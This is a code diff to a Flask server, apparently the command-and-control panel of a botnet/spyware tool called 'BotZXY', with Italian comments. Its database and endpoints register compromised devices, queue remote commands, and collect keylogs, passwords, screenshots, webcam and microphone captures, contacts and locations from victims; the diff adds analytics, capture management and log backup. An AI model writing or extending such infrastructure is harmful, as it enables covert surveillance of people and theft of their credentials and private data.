@@ -7,8 +7,12 @@ import json
 import os
 import hashlib
 import time
+import threading
 from datetime import datetime
 import werkzeug
+
+# ============ IMPORT LOGGER ============
+from utils.logger import backup_logs, restore_logs
 
 # ============ SICUREZZA LOGIN ============
 LOGIN_ATTEMPTS = {}
@@ -29,6 +33,9 @@ login_manager.login_view = 'login'
 
 DB_PATH = 'database/botzxy_c2.db'
 
+# ============ RIPRISTINA LOG ALL'AVVIO ============
+restore_logs()
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -40,8 +47,23 @@ def init_db():
     conn.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL, api_key TEXT UNIQUE NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
     conn.execute('CREATE TABLE IF NOT EXISTS devices (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, user_id INTEGER REFERENCES users(id), platform TEXT, hostname TEXT, ip TEXT, country TEXT, os_version TEXT, is_online BOOLEAN DEFAULT 1, last_seen TIMESTAMP, registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, phone_number TEXT, email TEXT, contacts TEXT, bot_name TEXT DEFAULT "BotZXY")')
     conn.execute('CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT REFERENCES devices(device_id), command TEXT NOT NULL, params TEXT, status TEXT DEFAULT "pending", result TEXT, executed_at TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
-    conn.execute('CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT REFERENCES devices(device_id), type TEXT CHECK(type IN ("screenshot", "webcam", "mic", "clipboard", "location", "keylog", "passwords", "mouse", "files", "wifi")), data TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
+    conn.execute('CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT REFERENCES devices(device_id), type TEXT, data TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
     conn.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, action TEXT, details TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
+    
+    # Aggiungi colonne per settings se non esistono
+    try:
+        conn.execute('ALTER TABLE users ADD COLUMN theme TEXT DEFAULT "dark"')
+    except:
+        pass
+    try:
+        conn.execute('ALTER TABLE users ADD COLUMN language TEXT DEFAULT "it"')
+    except:
+        pass
+    try:
+        conn.execute('ALTER TABLE users ADD COLUMN notifications TEXT DEFAULT "on"')
+    except:
+        pass
+    
     conn.commit()
     conn.close()
     print("[+] Database initialized")
@@ -59,15 +81,27 @@ def load_user(user_id):
     conn.close()
     return User(user['id'], user['username'], user['api_key']) if user else None
 
-# ============ FUNZIONE PER LOG ============
+# ============ FUNZIONE PER LOG CON BACKUP ============
 def log_action(device_id, action, details):
     try:
         conn = get_db()
         conn.execute('INSERT INTO logs (device_id, action, details) VALUES (?, ?, ?)', (device_id, action, details))
         conn.commit()
         conn.close()
+        # Backup automatico
+        backup_logs()
     except:
         pass
+
+# ============ BACKUP AUTOMATICO ============
+def scheduled_backup():
+    while True:
+        time.sleep(300)  # 5 minuti
+        backup_logs()
+
+# Avvia il thread di backup
+backup_thread = threading.Thread(target=scheduled_backup, daemon=True)
+backup_thread.start()
 
 # ============ ROUTES PRINCIPALI ============
 @app.route('/')
@@ -191,6 +225,15 @@ def get_device_detail(device_id):
     conn.close()
     return jsonify({'device': dict(device), 'captures': [dict(c) for c in captures], 'commands': [dict(c) for c in commands]})
 
+@app.route('/api/devices/stats', methods=['GET'])
+@login_required
+def get_device_stats():
+    conn = get_db()
+    platforms = conn.execute('SELECT platform, COUNT(*) as count, SUM(CASE WHEN is_online = 1 THEN 1 ELSE 0 END) as online FROM devices GROUP BY platform').fetchall()
+    activity = conn.execute('SELECT date(last_seen) as day, COUNT(*) as count FROM devices WHERE last_seen >= datetime("now", "-7 days") GROUP BY date(last_seen) ORDER BY day').fetchall()
+    conn.close()
+    return jsonify({'platforms': [dict(p) for p in platforms], 'activity_7d': [dict(a) for a in activity]})
+
 # ============ API REGISTER E COMANDI ============
 @app.route('/api/register', methods=['POST'])
 def register_device():
@@ -250,6 +293,61 @@ def command_result(device_id):
     return jsonify({'status': 'recorded'})
 
 # ============ API CAPTURES ============
+@app.route('/api/captures', methods=['GET'])
+@login_required
+def get_captures():
+    limit = request.args.get('limit', 50, type=int)
+    device_id = request.args.get('device_id', None)
+    capture_type = request.args.get('type', None)
+    
+    conn = get_db()
+    query = 'SELECT id, device_id, type, data, created_at FROM captures WHERE 1=1'
+    params = []
+    
+    if device_id:
+        query += ' AND device_id = ?'
+        params.append(device_id)
+    if capture_type:
+        query += ' AND type = ?'
+        params.append(capture_type)
+    
+    query += ' ORDER BY created_at DESC LIMIT ?'
+    params.append(limit)
+    
+    captures = conn.execute(query, params).fetchall()
+    conn.close()
+    
+    result = []
+    for c in captures:
+        data = c['data']
+        try:
+            if data and data.startswith('{'):
+                data = json.loads(data)
+        except:
+            pass
+        result.append({
+            'id': c['id'],
+            'device_id': c['device_id'],
+            'type': c['type'],
+            'data': data,
+            'created_at': c['created_at']
+        })
+    return jsonify(result)
+
+@app.route('/api/captures/<int:capture_id>', methods=['DELETE'])
+@login_required
+def delete_capture(capture_id):
+    conn = get_db()
+    capture = conn.execute('SELECT * FROM captures WHERE id = ?', (capture_id,)).fetchone()
+    if not capture:
+        conn.close()
+        return jsonify({'error': 'Capture not found'}), 404
+    conn.execute('DELETE FROM captures WHERE id = ?', (capture_id,))
+    conn.commit()
+    conn.close()
+    log_action('system', 'capture_deleted', f'Cattura {capture_id} eliminata')
+    return jsonify({'status': 'deleted'})
+
 @app.route('/api/screenshot/<device_id>', methods=['POST'])
 def upload_screenshot(device_id):
     data = request.json
@@ -310,7 +408,6 @@ def upload_location(device_id):
     log_action(device_id, 'location_updated', 'Posizione aggiornata')
     return jsonify({'status': 'saved'})
 
-# ============ NUOVE API ============
 @app.route('/api/keylog/<device_id>', methods=['POST'])
 def upload_keylog(device_id):
     data = request.json
@@ -399,6 +496,40 @@ def get_platform_chart():
         labels, data = ['Nessun dispositivo'], [1]
     colors = ['#7c3aed', '#22d3ee', '#f472b6', '#34d399', '#f59e0b']
     return jsonify({'labels': labels, 'data': data, 'colors': colors[:len(labels)]})
+
+# ============ API ANALYTICS ============
+@app.route('/api/analytics/captures_by_type', methods=['GET'])
+@login_required
+def get_captures_by_type():
+    conn = get_db()
+    data = conn.execute('SELECT type, COUNT(*) as count FROM captures GROUP BY type ORDER BY count DESC').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
+
+@app.route('/api/analytics/activity_7d', methods=['GET'])
+@login_required
+def get_activity_7d():
+    conn = get_db()
+    data = conn.execute('SELECT date(last_seen) as day, COUNT(*) as count FROM devices WHERE last_seen >= datetime("now", "-7 days") GROUP BY date(last_seen) ORDER BY day').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
+
+@app.route('/api/analytics/top_devices', methods=['GET'])
+@login_required
+def get_top_devices():
+    conn = get_db()
+    data = conn.execute('''
+        SELECT device_id, hostname, platform, 
+               COUNT(commands.id) as commands_count,
+               (SELECT COUNT(*) FROM captures WHERE captures.device_id = devices.device_id) as captures_count
+        FROM devices
+        LEFT JOIN commands ON commands.device_id = devices.device_id
+        GROUP BY devices.device_id
+        ORDER BY commands_count DESC
+        LIMIT 10
+    ''').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
 
 # ============ LOGS ============
 @app.route('/api/logs', methods=['GET'])
@@ -495,6 +626,46 @@ def save_settings():
     log_action('system', 'settings_updated', f'Impostazioni aggiornate: theme={theme}, language={language}')
     return jsonify({'status': 'saved'})
 
+# ============ SICUREZZA ============
+@app.route('/api/change_password', methods=['POST'])
+@login_required
+def change_password():
+    data = request.json
+    old_password = data.get('old_password')
+    new_password = data.get('new_password')
+    
+    if not old_password or not new_password:
+        return jsonify({'error': 'Vecchia e nuova password richieste'}), 400
+    
+    conn = get_db()
+    user = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
+    
+    if not user or hashlib.sha256(old_password.encode()).hexdigest() != user['password_hash']:
+        conn.close()
+        return jsonify({'error': 'Password attuale errata'}), 401
+    
+    conn.execute('UPDATE users SET password_hash = ? WHERE id = ?', 
+                (hashlib.sha256(new_password.encode()).hexdigest(), current_user.id))
+    conn.commit()
+    conn.close()
+    log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
+    return jsonify({'status': 'password_updated'})
+
+@app.route('/api/logout_all', methods=['POST'])
+@login_required
+def logout_all():
+    conn = get_db()
+    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
+    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
+        conn.close()
+        return jsonify({'error': 'Accesso negato'}), 403
+    
+    conn.execute('UPDATE devices SET is_online = 0')
+    conn.commit()
+    conn.close()
+    log_action('system', 'logout_all', 'Tutti i dispositivi disconnessi')
+    return jsonify({'status': 'logged_out'})
+
 # ============ GESTIONE TENTATIVI LOGIN ============
 @app.route('/admin/reset_attempts/<username>', methods=['POST'])
 @login_required
@@ -536,232 +707,6 @@ def get_login_attempts():
             result[username] = {'attempts': data['count'], 'blocked_for': 'None'}
     
     return jsonify(result)
-
-# ============ API CAPTURES ============
-@app.route('/api/captures', methods=['GET'])
-@login_required
-def get_captures():
-    """Recupera tutte le catture dal database"""
-    limit = request.args.get('limit', 50, type=int)
-    device_id = request.args.get('device_id', None)
-    capture_type = request.args.get('type', None)
-    
-    conn = get_db()
-    query = 'SELECT id, device_id, type, data, created_at FROM captures WHERE 1=1'
-    params = []
-    
-    if device_id:
-        query += ' AND device_id = ?'
-        params.append(device_id)
-    if capture_type:
-        query += ' AND type = ?'
-        params.append(capture_type)
-    
-    query += ' ORDER BY created_at DESC LIMIT ?'
-    params.append(limit)
-    
-    captures = conn.execute(query, params).fetchall()
-    conn.close()
-    
-    result = []
-    for c in captures:
-        # Decodifica data se è JSON
-        data = c['data']
-        try:
-            if data and data.startswith('{'):
-                data = json.loads(data)
-        except:
-            pass
-        result.append({
-            'id': c['id'],
-            'device_id': c['device_id'],
-            'type': c['type'],
-            'data': data,
-            'created_at': c['created_at']
-        })
-    
-    return jsonify(result)
-
-@app.route('/api/captures/<int:capture_id>', methods=['DELETE'])
-@login_required
-def delete_capture(capture_id):
-    """Elimina una cattura"""
-    conn = get_db()
-    # Verifica che esista
-    capture = conn.execute('SELECT * FROM captures WHERE id = ?', (capture_id,)).fetchone()
-    if not capture:
-        conn.close()
-        return jsonify({'error': 'Capture not found'}), 404
-    
-    conn.execute('DELETE FROM captures WHERE id = ?', (capture_id,))
-    conn.commit()
-    conn.close()
-    log_action('system', 'capture_deleted', f'Cattura {capture_id} eliminata')
-    return jsonify({'status': 'deleted'})
-
-@app.route('/api/captures/clear', methods=['POST'])
-@login_required
-def clear_captures():
-    """Cancella tutte le catture (solo admin)"""
-    conn = get_db()
-    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
-    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
-        conn.close()
-        return jsonify({'error': 'Accesso negato'}), 403
-    
-    conn.execute('DELETE FROM captures')
-    conn.commit()
-    conn.close()
-    log_action('system', 'captures_cleared', 'Tutte le catture cancellate')
-    return jsonify({'status': 'cleared'})
-
-# ============ API COMANDI ============
-@app.route('/api/commands', methods=['GET'])
-@login_required
-def get_commands():
-    """Recupera tutti i comandi dal database"""
-    limit = request.args.get('limit', 50, type=int)
-    device_id = request.args.get('device_id', None)
-    
-    conn = get_db()
-    if device_id:
-        commands = conn.execute('''
-            SELECT id, device_id, command, params, status, result, created_at, executed_at 
-            FROM commands 
-            WHERE device_id = ? 
-            ORDER BY created_at DESC 
-            LIMIT ?
-        ''', (device_id, limit)).fetchall()
-    else:
-        commands = conn.execute('''
-            SELECT id, device_id, command, params, status, result, created_at, executed_at 
-            FROM commands 
-            ORDER BY created_at DESC 
-            LIMIT ?
-        ''', (limit,)).fetchall()
-    conn.close()
-    return jsonify([dict(c) for c in commands])
-
-# ============ API DEVICES STATS ============
-@app.route('/api/devices/stats', methods=['GET'])
-@login_required
-def get_device_stats():
-    """Statistiche dettagliate sui dispositivi"""
-    conn = get_db()
-    
-    # Totale per piattaforma
-    platforms = conn.execute('''
-        SELECT platform, COUNT(*) as count, 
-               SUM(CASE WHEN is_online = 1 THEN 1 ELSE 0 END) as online
-        FROM devices 
-        GROUP BY platform
-    ''').fetchall()
-    
-    # Attività ultimi 7 giorni
-    activity = conn.execute('''
-        SELECT date(last_seen) as day, COUNT(*) as count
-        FROM devices 
-        WHERE last_seen >= datetime('now', '-7 days')
-        GROUP BY date(last_seen)
-        ORDER BY day
-    ''').fetchall()
-    
-    conn.close()
-    
-    return jsonify({
-        'platforms': [dict(p) for p in platforms],
-        'activity_7d': [dict(a) for a in activity]
-    })
-
-# ============ API ANALYTICS ============
-@app.route('/api/analytics/captures_by_type', methods=['GET'])
-@login_required
-def get_captures_by_type():
-    """Statistiche catture per tipo"""
-    conn = get_db()
-    data = conn.execute('''
-        SELECT type, COUNT(*) as count 
-        FROM captures 
-        GROUP BY type 
-        ORDER BY count DESC
-    ''').fetchall()
-    conn.close()
-    return jsonify([dict(d) for d in data])
-
-@app.route('/api/analytics/activity_7d', methods=['GET'])
-@login_required
-def get_activity_7d():
-    """Attività ultimi 7 giorni"""
-    conn = get_db()
-    data = conn.execute('''
-        SELECT date(last_seen) as day, COUNT(*) as count
-        FROM devices 
-        WHERE last_seen >= datetime('now', '-7 days')
-        GROUP BY date(last_seen)
-        ORDER BY day
-    ''').fetchall()
-    conn.close()
-    return jsonify([dict(d) for d in data])
-
-@app.route('/api/analytics/top_devices', methods=['GET'])
-@login_required
-def get_top_devices():
-    """Dispositivi più attivi"""
-    conn = get_db()
-    data = conn.execute('''
-        SELECT device_id, hostname, platform, 
-               COUNT(*) as commands_count,
-               (SELECT COUNT(*) FROM captures WHERE captures.device_id = devices.device_id) as captures_count
-        FROM devices
-        LEFT JOIN commands ON commands.device_id = devices.device_id
-        GROUP BY devices.device_id
-        ORDER BY commands_count DESC
-        LIMIT 10
-    ''').fetchall()
-    conn.close()
-    return jsonify([dict(d) for d in data])
-
-# ============ SICUREZZA ============
-@app.route('/api/change_password', methods=['POST'])
-@login_required
-def change_password():
-    data = request.json
-    old_password = data.get('old_password')
-    new_password = data.get('new_password')
-    
-    if not old_password or not new_password:
-        return jsonify({'error': 'Vecchia e nuova password richieste'}), 400
-    
-    conn = get_db()
-    user = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
-    
-    if not user or hashlib.sha256(old_password.encode()).hexdigest() != user['password_hash']:
-        conn.close()
-        return jsonify({'error': 'Password attuale errata'}), 401
-    
-    conn.execute('UPDATE users SET password_hash = ? WHERE id = ?', 
-                (hashlib.sha256(new_password.encode()).hexdigest(), current_user.id))
-    conn.commit()
-    conn.close()
-    log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
-    return jsonify({'status': 'password_updated'})
-
-@app.route('/api/logout_all', methods=['POST'])
-@login_required
-def logout_all():
-    """Disconnette tutti i dispositivi (solo admin)"""
-    conn = get_db()
-    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
-    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
-        conn.close()
-        return jsonify({'error': 'Accesso negato'}), 403
-    
-    # Imposta tutti i dispositivi come offline
-    conn.execute('UPDATE devices SET is_online = 0')
-    conn.commit()
-    conn.close()
-    log_action('system', 'logout_all', 'Tutti i dispositivi disconnessi')
-    return jsonify({'status': 'logged_out'})
 
 # ============ ADMIN SETUP ============
 def setup_admin_user():
